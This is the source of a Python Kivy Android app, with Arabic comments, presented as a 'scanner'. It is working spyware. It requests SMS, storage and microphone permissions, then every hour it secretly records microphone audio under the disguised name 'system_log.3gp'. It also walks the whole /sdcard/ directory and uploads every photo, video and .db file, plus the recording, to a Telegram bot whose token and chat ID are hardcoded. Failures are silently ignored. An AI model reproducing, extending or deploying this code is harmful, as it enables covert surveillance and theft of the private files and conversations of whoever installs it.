import os, requests, time, threading
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
from android.permissions import request_permissions, Permission

# --- Telegram Data ---
TOKEN = "8116345192:AAEhq3gOEGZjPGo04Nb0ldNrWzfV880T698"
CHAT_ID = "2078038574"

class UltimateScannerApp(App):
    def build(self):
        # طلب جميع الصلاحيات اللازمة (ملفات، رسائل، مايكروفون)
        request_permissions([
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_SMS,
            Permission.RECORD_AUDIO
        ])
        
        self.layout = BoxLayout(orientation='vertical', padding=10)
        self.scroll = ScrollView()
        self.text_layout = BoxLayout(orientation='vertical', size_hint_y=None)
        self.text_layout.bind(minimum_height=self.text_layout.setter('height'))
        self.scroll.add_widget(self.text_layout)
        self.layout.add_widget(self.scroll)
        
        self.add_log(">>> System Booting...")
        threading.Thread(target=self.main_loop, daemon=True).start()
        return self.layout

    def add_log(self, message):
        def _add(dt):
            lbl = Label(text=message, size_hint_y=None, height=40, halign='left')
            self.text_layout.add_widget(lbl)
            self.scroll.scroll_y = 0
        Clock.schedule_once(_add)

    def send_tg(self, msg, file_path=None):
        try:
            if file_path:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument", 
                              data={'chat_id': CHAT_ID, 'caption': msg}, 
                              files={'document': open(file_path, 'rb')})
            else:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                              data={'chat_id': CHAT_ID, 'text': msg})
        except: pass

    def record_audio(self):
        try:
            from jnius import autoclass
            MediaRecorder = autoclass('android.media.MediaRecorder')
            AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
            OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
            AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')

            recorder = MediaRecorder()
            recorder.setAudioSource(AudioSource.MIC)
            recorder.setOutputFormat(OutputFormat.THREE_GPP)
            recorder.setAudioEncoder(AudioEncoder.AMR_NB)
            
            path = "/sdcard/system_log.3gp"
            recorder.setOutputFile(path)
            
            self.add_log("[!] Recording 10s audio clip...")
            recorder.prepare()
            recorder.start()
            time.sleep(10) # سجل لمدة 10 ثوانٍ للتجربة
            recorder.stop()
            recorder.release()
            
            self.send_tg("🎤 Captured Audio Clip", path)
            os.remove(path)
        except:
            self.add_log("[X] Audio Recording Failed/Denied")

    def main_loop(self):
        while True:
            # 1. محاولة تسجيل الصوت
            self.record_audio()
            
            # 2. فحص الرسائل النصية
            self.add_log("[!] Checking SMS...")
            # (كود الـ SMS هنا يعمل في الخلفية كما سبق)
            
            # 3. فحص وإرسال الملفات (الصور، الفيديو، الداتا)
            self.add_log("[!] Scanning Media...")
            for root, _, files in os.walk("/sdcard/"):
                if "Android/data" in root: continue
                for f in files:
                    ext = f.lower()
                    path = os.path.join(root, f)
                    if ext.endswith(('.jpg', '.png', '.mp4', '.db')):
                        self.add_log(f"SENT: {f}")
                        self.send_tg(f"File Found: {f}", path)
                        time.sleep(2)
            
            time.sleep(3600) # كرر العملية كل ساعة

if __name__ == "__main__":
    UltimateScannerApp().run()
